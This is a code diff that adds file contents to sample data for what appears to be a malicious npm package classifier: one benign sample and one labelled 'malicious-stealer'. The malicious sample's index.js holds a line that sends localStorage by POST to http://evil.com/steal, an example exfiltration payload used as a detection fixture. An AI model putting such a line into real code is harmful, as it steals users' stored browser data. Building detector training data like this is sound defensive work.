@@ -50,7 +50,10 @@ def create_sample_data():
         package_name="sample-utils",
         ecosystem="npm",
         label=0,
-        graph_data=None,  # Will be created by trainer
+        file_contents={
+            "index.js": "function isValid(input) { return input != null && input.length > 0; }",
+            "package.json": '{"name": "sample-utils", "version": "1.0.0"}'
+        },
         sample_type="benign",
         metadata={}
     )
@@ -60,7 +63,10 @@ def create_sample_data():
         package_name="malicious-stealer",
         ecosystem="npm",
         label=1,
-        graph_data=None,  # Will be created by trainer
+        file_contents={
+            "index.js": "function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
+            "package.json": '{"name": "malicious-stealer", "version": "1.0.0"}'
+        },
         sample_type="malicious_intent",
         metadata={}
     )
